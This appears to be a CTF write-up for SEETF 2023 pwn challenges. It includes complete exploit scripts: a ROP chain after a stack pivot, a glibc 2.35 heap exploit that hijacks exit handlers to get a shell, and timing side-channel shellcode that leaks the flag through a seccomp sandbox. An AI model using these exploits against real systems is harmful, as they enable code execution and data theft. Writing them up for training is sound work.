@@ -1,0 +1,594 @@
+---
+title: "SEETF 2023 Writeup"
+date: "2023-06-15"
+tags: ['Writeup', 'Pwn']
+draft: false
+summary: "This weekend I participated in the SEETF 2023 event. The challenges are in good quality (two needs brute force). And I managed to solve a heap binary compiled with gilibc version 2.35 by abusing the exit handler since malloc_hook and free_hook are removed after 2.34."
+---
+
+This weekend I participated in the SEETF 2023 event. The challenges are in good quality (two needs brute force). And I managed to solve a heap binary compiled with gilibc version 2.35 by abusing the exit handler since malloc_hook and free_hook are removed after 2.34.
+
+
+
+## Pwn
+
+### great expectation
+
+This challenge is about stack pivot + rop.
+
+The vulnerability is at the input_float function. We can input three floats (4 bytes each, irrespective of a 32-bit or 64-bit machine). The memory saved at `rbp-0x4` is 4 bytes. When we input the second float, the saved memory shifts to `rbp-0x3`, allowing an overflow to the rbp by one bit and thus, two bytes in total.
+
+A check is run to verify if rbp-0x1 is 'A'. So, we need to input a float number that satisfies this condition. Use Python's `struct.unpack('f', b)` to find such a float easily.
+
+```
+#define floatbuffer_len 3
+#define string_len 0x107
+
+int idx;
+
+void input_floats()
+{
+    char canary = 'A'; // rbp-0x1 byte
+    char buffer[floatbuffer_len]; // rbp-0x1, rbp-0x2, rbp-0x3
+
+    for (idx = 0; idx < floatbuffer_len; idx++)
+    {
+        puts("Give me a crazy number!");
+        scanf("%f", &buffer[idx]);
+    }
+
+    if (canary != 'A')
+    {
+        exit(0);
+    }
+}
+```
+
+By using the overflow on rbp of input_float function, we can let it points to the place we under control where placing our rop chain. The memory layout looks like the following firgure:
+![great-expectation-2](/static/images/seeCTF-2023-Writeup/great-expectation-2.png)
+
+However, the problem is that since we don't know any memory address when overflowing occurs, so we need to brute force the last two bytes of stack address, the success chance would be 1/8192.
+
+The overall payload:
+
+```
+def bytes2float(b):
+    return struct.unpack('f', b)
+
+def crazy_number(sh, num):
+    sh.sendlineafter("Give me a crazy number!", str(num).encode())
+
+def try_exploit(sh):
+    """
+        Solution:
+        1/ float2bytes to overwrite the rbp to points to our rop chain addr - 0x10, then rop to leak libc address
+        2/ first payload to leak libc address, then second payload to get shell
+    """
+
+    ### Stage 1: leak libc address
+    ### Condition: the input tale in main starts at 0xd0d0 1/8192
+    rop = ROP(binary) 
+
+    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]  # this might vary based on the binary
+    ret = rop.find_gadget(['ret'])[0]
+
+    rop_glibc_libc = flat(
+        pop_rdi,
+        binary.got['puts'],
+        binary.plt['puts'],
+        binary.symbols['main']  # return to main for the next payload
+    )
+
+    rop_glibc_libc = b'A'*0x70 + p64(0xdeadbeef) + rop_glibc_libc
+
+    sh.sendlineafter("Tell me an adventurous tale.", rop_glibc_libc)
+
+    crazy_number(sh, 0)
+    crazy_number(sh, 0)
+    crazy_number(sh, -27951366144.0) # b'\x00\x41\xd0\xd0'
+
+    sh.recvline()
+
+    try:
+        raw_puts_addr = sh.recvline()[:-1]
+    except EOFError:
+        sh.close()
+        return
+
+    puts_addr = get_leaked_addr_raw(raw_puts_addr, 0)
+    log.info("puts_addr: " + hex(puts_addr))
+
+    glibc_base, system_addr, binsh_addr = get_libcbase(puts_addr, 'puts')
+    log.info("glibc_base: " + hex(glibc_base))
+    log.info("system_addr: " + hex(system_addr))
+    log.info("binsh_addr: " + hex(binsh_addr))
+
+    sh.recvuntil(b"Tell me an adventurous tale.")
+
+    rop2 = ROP(binary)
+
+    rop_shell = flat(
+        pop_rdi,
+        binsh_addr,
+        ret,
+        system_addr,
+    )
+
+    rop2 = b'A'*0x20 + p64(0xdeadbeef) + rop_shell
+
+    sh.sendline(rop2)
+
+    crazy_number(sh, 0)
+    crazy_number(sh, 0)
+    crazy_number(sh, -8606973952.0) # b'\x00\x41\x00\xd0'
+
+    sh.sendline("cat /flag")
+    sh.recvline()
+
+    sh.interactive()
+
+
+if __name__ == "__main__":
+    count = 0
+    while True:
+        sh = start()
+        try_exploit(sh)
+
+        count += 1
+        log.info("Tried %d times" % count)
+```
+
+![great-expectation-1](/static/images/seeCTF-2023-Writeup/great-expectation-1.png)
+
+### babySheep
+
+This is a heap challenge compiled with `Ubuntu GLIBC 2.35-0ubuntu3.1` glibc. Due to the absence of `malloc_hook` or `free_hook`, to hijack the control flow, we either need to place the ROP chain or abusing the exit handler, which is a post-2.35 heap exploitation technique has been explained at [here](https://m101.github.io/binholic/2017/05/20/notes-on-abusing-exit-handlers.html) and [here](https://ctftime.org/writeup/34804).
+
+**uninitialized variable accessing to UAF**
+
+The vulnerability is found by my teammate @Zeynarz and I followed up his work.
+
+There is an uninitialized variable vulnerability in create, update and delete function. Upon viewing the stack memory layout, we could found that:
+
+```
+in update:             
+0x7fffffffe00c = buffer_size
+0x7fffffffe010 = ptr
+                 
+in create:                  
+0x7fffffffe00c = 0x5555
+0x7fffffffe010 = footer
+                                                                                                          
+in output:
+0x7fffffffe00c = buffer_size
+0x7fffffffe010 = ptr
+
+in delete:                                                
+0x7fffffffe00c = buffer_size
+0x7fffffffe010 = ptr
+```
+
+However, this vulnerability can also be identified (hardly) by finding variables that can be uninitialized under some condition and then be used in the following code upon the source code level.
+
+So, we could get a UAF by `create(0)->delete(0)->update(-1)/output(-1)`.  By abusing this UAF, we could get arbitrary address read and writing through tcache poisoning.
+
+**abusing exit handler **
+
+In the delete function, we can found that it tries to register the cleanup function to the exit function list which gives us the hint to use the exit handler to get shell.
+
+```
+void delete()
+{
+    int idx;
+    puts("Which text? (0-9)");
+    scanf("%d", &idx);
+
+    if (idx >= 0 && idx <= 9)
+    {
+        unsigned int buffer_size = buffer_sizes[idx];
+        buffer_sizes[idx] = 0;
+        if (buffer_size != 0)
+        {
+            buffer_sizes[idx] = 0;
+        }
+
+        struct text *ptr = texts[idx];
+        if (ptr != NULL)
+        {
+            free(ptr);
+            texts[idx] = NULL;
+            atexit(cleanup); // free ALL pointers on exit
+        }
+    }
+}
+```
+
+There is an unpublished symbol `__exit_funcs` in the glibc area that holds a linked list of functions to be executed before the program exits. Its address can be retrieved by tracing the exit function during debugging.
+
+```
+void exit (int status)
+{
+  __run_exit_handlers (status, &__exit_funcs, true, true);
+}
+```
+
+![babysheep-exit-1](/static/images/seeCTF-2023-Writeup/babysheep-exit-1.png)
+
+Here is the struct of the list of exit handler function:
+
+```
+enum
+{
+  ef_free,  /* `ef_free' MUST be zero!  */
+  ef_us,
+  ef_on,
+  ef_at,
+  ef_cxa
+};
+
+struct exit_function
+  {
+    /* `flavour' should be of type of the `enum' above but since we need
+       this element in an atomic operation we have to use `long int'.  */
+    long int flavor;
+    union
+      {
+    void (*at) (void);
+    struct
+      {
+        void (*fn) (int status, void *arg);
+        void *arg;
+      } on;
+    struct
+      {
+        void (*fn) (void *arg, int status);
+        void *arg;
+        void *dso_handle;
+      } cxa;
+      } func;
+  };
+  
+struct exit_function_list
+  {
+    struct exit_function_list *next;
+    size_t idx;
+    struct exit_function fns[32];
+  };
+```
+
+To hijack the exiting process, we can leverage the cxa struct inside where saves a function pointer and passing argument address. That's said, we can overwrite the one item in the exit_function_list as the following:
+
+```
+#############  next | count  | type (cxa) | addr                             | arg               | not used
+onexit_fun = p64(0) + p64(1) + p64(4)     + encrypt(libc.sym['system'], key) + p64(binsh_addr) + p64(0)
+```
+
+**leak the encryption key**
+
+The problem is that the function pointer has been encrypted by the following encryption algorithm with `fs:0x30` as the key. To fill the correct encrypted function pointer, we need to leak the key first.
+
+```
+# Rotate left: 0b1001 --> 0b0011
+rol = lambda val, r_bits, max_bits: \
+    (val << r_bits%max_bits) & (2**max_bits-1) | \
+    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))
+ 
+# Rotate right: 0b1001 --> 0b1100
+ror = lambda val, r_bits, max_bits: \
+    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
+    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
+
+# encrypt a function pointer
+def encrypt(v, key):
+    return rol(v ^ key, 0x11, 64)
+```
+
+Although the `fs:0x30` won't be load to the memory at anytime, it doesn't means that we cannot compute its value. If we know the encryption function ptr as well as the origin function ptr, we can then leak the key's value as they are using xor operation is reversible.
+
+```
+key = ror(encrypted_func_ptr, 0x11, 64) ^ func_ptr
+```
+
+This can be done by using our arbitrary address read, as the encrypted cleanup function ptr is saved on the glibc memory with a fixed offset.
+
+**get shell**
+
+Finally, we can leverage the arbitrary address write to overwrite one exit function on the list and then exit the binary. The overall payload is as follows.
+
+```
+sh = start()
+count = 0
+HEAPBASE = 0
+LIBCBASE = 0
+
+def create(size, content):
+    global count
+    count += 1                              
+    sh.sendlineafter(b"5. [E]xit", b"C")
+    sh.sendlineafter(b"What size?", str(size).encode())
+    sh.sendlineafter(b"What content?", content)
+
+    return count-1
+                             
+def output(idx, ignore=False): 
+    sh.sendlineafter(b"5. [E]xit", b"O")
+    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())                                                                   
+    sh.recv()                                             
+    return sh.recvuntil(b"1.")[:-2]
+                                                          
+def update(idx,content):                                  
+    sh.sendlineafter(b"5. [E]xit", b"U")
+    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())
+    sh.sendline(content)                                  
+
+def delete(idx):
+    global count
+    count -= 1
+    sh.sendlineafter(b"5. [E]xit", b"D")
+    sh.sendlineafter(b"Which text? (0-9)",str(idx).encode())              
+
+def mangle(pos, ptr):
+    return p64((pos >> 12) ^ ptr)
+                             
+def demangle(obfus_ptr):
+    o2 = (obfus_ptr >> 12) ^ obfus_ptr
+    return (o2 >> 24) ^ o2
+
+def heap_leak():
+    create(32,"abcd")
+    delete(0)                              
+
+    # deobfuscation of the obfuscated pointer (which is just null)
+    heap_leak = u64(output(-1)[:5].ljust(8,b"\x00"))  
+    heap_base = (heap_leak ^ 0) << 12
+    log.info(f"leak the heap base: {hex(heap_base)}") 
+
+    global HEAPBASE
+    HEAPBASE = heap_base
+
+    return heap_base
+
+def glibc_leak():
+    create(0x500,"abcd")
+    create(16,"abcd") # prevent consolidation, idx = 1
+    delete(0)
+
+    glibc_base = u64(output(-1)[:6].ljust(8,b"\x00")) - 0x219ce0
+    libc.address = glibc_base
+    log.info(f"leak the glibc base: {hex(glibc_base)}") 
+
+    ## clean it up
+    create(0x500,"abcd") # make things easier by clearing out all free chunks
+
+    global LIBCBASE
+    LIBCBASE = glibc_base
+
+    return glibc_base
+
+def arbitrary_addr_read(addr):
+    """
+        addr needs to ends with 0x8
+        the addr should has rw- permission
+    """
+    idx0 = create(48,"abcd") # 2
+    idx1 = create(48,"abcd") # 3
+    idx2 = create(48,"abcd") # 4
+
+    delete(idx2)
+    delete(idx1)
+    delete(idx0)
+
+    idx3 = create(48,"/bin/sh") # 2
+    update(-1, mangle(HEAPBASE, addr-0x18)) # 3
+
+    idx4 = create(48,"abcd") # 3
+    idx5 = create(48,b"A"*7) # 4
+
+    leak = output(idx5)[0x10:]
+    log.info(f"LEAK: {leak}")
+
+    return leak
+
+
+def arbitrary_addr_write(addr, val):
+
+    delete(0)
+    delete(1)
+    delete(2)
+
+    create(64,"abcd") # 0
+    create(64,"abcd") # 1
+    create(64,"abcd") # 2
+
+
+    delete(2)
+    delete(1)
+    delete(0)
+
+    create(64,"/bin/sh") # 0
+    update(-1, mangle(HEAPBASE, addr-0x10)) # 1
+
+    idx4 = create(64,"abcd") # 2
+    idx5 = create(64,val) # 9
+
+
+
+def exploit():
+    ### Step 1: leak the heap base and glibc base
+    heap_leak()
+    glibc_leak()
+    binsh_addr = next(libc.search(b"/bin/sh"))
+    log.info(f"leak the binsh addr: {hex(binsh_addr)}")
+
+    ### Step 2: leak the elf loading address 
+    elf_ptr = LIBCBASE + 0x21AF48 # points to elf_base + 0x4008
+    raw_elf_addr = arbitrary_addr_read(elf_ptr)[0x8:0x10]
+    elf_base_addr = get_leaked_addr_raw(raw_elf_addr, 0) - 0x4008
+
+    cleanup_addr = elf_base_addr + 0x12C8
+    backdoor_addr = elf_base_addr + 0x12A9
+
+    log.info(f"leak the elf base: {hex(elf_base_addr)}")
+    log.info(f"leak the cleanup func: {hex(cleanup_addr)}")
+    log.info(f"leak the backdoor func: {hex(backdoor_addr)}")
+
+    ### Step 3: leak the encrypted key
+    ### through debugging the exit func
+    ### __exit_funcs = 0x00007f4b5dc19838 glibc+0x219838
+    ### __exit_funcs[0] = 0x00007f4b5dc19838 glibc+0x219838
+    ### __exit_funcs[1] = 0x00007f4b5dc1af00 glibc+0x21AF00
+    ### encryped_ptr stores at __exit_funcs[1] + 0xa0 + 0x38
+    encrypted_cleanup_ptr = LIBCBASE + 0x21AF00 + 0xa0 + 0x38
+    raw_encrypted_cleanup = arbitrary_addr_read(encrypted_cleanup_ptr)[0x8:0x10]
+    encrypted_cleanup = get_leaked_addr_raw(raw_encrypted_cleanup, 0)
+    log.info(f"leak the encrypted cleanup ptr: {hex(encrypted_cleanup)}")
+
+    # ### calculate the key
+    key = ror(encrypted_cleanup, 0x11, 64) ^ cleanup_addr
+    log.info(f"calculate the key: {hex(key)}")
+    if (encrypt(cleanup_addr, key) == encrypted_cleanup):
+        log.info("sanity check passed!")
+    
+    # ### Step 4: overwrite the cleanup func with backdoor in exit_function_list
+    payload = p64(0) + p64(2) + p64(4) + p64(encrypt(backdoor_addr, key))+p64(binsh_addr) + p64(0)
+    log.info(f"encrypted backdoor: {hex(encrypt(backdoor_addr, key))}")
+
+    arbitrary_addr_write(LIBCBASE + 0x21AF00, payload)
+
+    sh.sendline(b'E')
+    sh.sendline(b'cat /flag')
+
+    sh.interactive()
+
+if __name__ == "__main__":
+    exploit()
+```
+
+The exploit process can also be illustrated by the exploitation output:
+
+![babysheep-2](/static/images/seeCTF-2023-Writeup/babysheep-2.png)
+
+### SaaS
+
+Can you read the flag by only using 6 bytes shellcode with open/read-allowed seccomp sandbox in place? They provided the source code of the challenge.
+
+```
+int main(int argc, char **argv, char **envp)
+{
+    shellcode_mem = mmap((void *) 0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
+    assert(shellcode_mem == (void *) 0x1337000);
+
+    puts("Welcome to the SEETF shellcode sandbox!");
+    puts("======================================");
+    puts("Allowed syscalls: open, read");
+    puts("You've got 6 bytes, make them count!");
+    puts("======================================");
+    fflush(stdout);
+
+    shellcode_size = read(0, shellcode_mem, 0x6);
+    assert(shellcode_size > 0);
+
+    scmp_filter_ctx ctx;
+    ctx = seccomp_init(SCMP_ACT_KILL);
+
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0) == 0);    
+    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
+
+    assert(seccomp_load(ctx) == 0);
+
+    ((void(*)())shellcode_mem)();
+}
+```
+
+Since I didn't responsible for solving this challenge during the game, so I just leave the idea here: 
+
+1. Leveraging the first 6 bytes to make a read `syscall` in order to read following payloads from stdin to the assigned memory region. 
+2. Using the second stage payload to open and read the flag to the memory.
+3. Hold the memory address and check one bit of a byte each time. Check the response duration to find out the bit should be 0 or 1. (Looks like a side-channel brute force attack)
+
+Here is the payload from @maxigir.
+
+```
+// bruteforce i_byte's i_bit
+def gen_payload(i_byte, i_bit):
+    filename = b'/flag'
+    filename += b'\x00'*(8-len(filename))
+    filename = struct.pack('Q',int.from_bytes(filename,'big'))
+    
+    payload = asm("""
+        push rdx
+        pop rsi
+        xor edi,edi
+        syscall
+    """, arch='x86_64', os='linux')
+    
+    payload += b"\x90"*6
+    
+    payload += asm(f""" 
+        mov rbx, 0x{filename.hex()}
+        push rbx
+        mov rdi, rsp
+        mov rsi, 0
+        mov rax, 0x2
+        syscall
+    
+        mov rdi, rax
+        mov rsi, rsp
+        mov rdx, 0x200
+        mov rax, 0x0
+        syscall
+    
+        mov rax, [rsp+{i_byte}]
+        and rax, {1<<i_bit}
+        shr rax, {i_bit}
+        
+        mov r11, 0x0
+        imul rax, 0x10000000
+        loop_start:
+        cmp rax, r11
+        je loop_finished
+        inc r11
+        imul ebx, 0x13
+        jmp loop_start
+
+        loop_finished:
+    """, arch='x86_64', os='linux')
+    return payload
+    
+def get_bit(i_byte, i_bit):
+
+    #conn = process('./chall')
+    conn = remote('win.the.seetf.sg', 2002)
+
+    for _ in range(5):
+        conn.recvline()
+
+    start = datetime.now()
+    payload = gen_payload(i_byte,i_bit)
+    conn.send(payload)
+    conn.recvall()
+    duration = (datetime.now()-start).total_seconds()
+
+    #print(i_bit,duration)
+    return duration > 1.5
+
+def get_byte(i_byte):
+    byte = 0
+    for i in range(7):
+        byte += get_bit(i_byte,i) << i
+        p.status(flag+chr(byte))
+        #print(flag+chr(byte))
+    return chr(byte)
+
+context.log_level = 'error'
+
+p = log.progress('Flag',level=logging.ERROR)
+
+flag = ''
+for i in range(200):
+    flag += get_byte(i)
+```
+
+### CSTutorial
+
+This challenge is about abusing the file struct in linux.
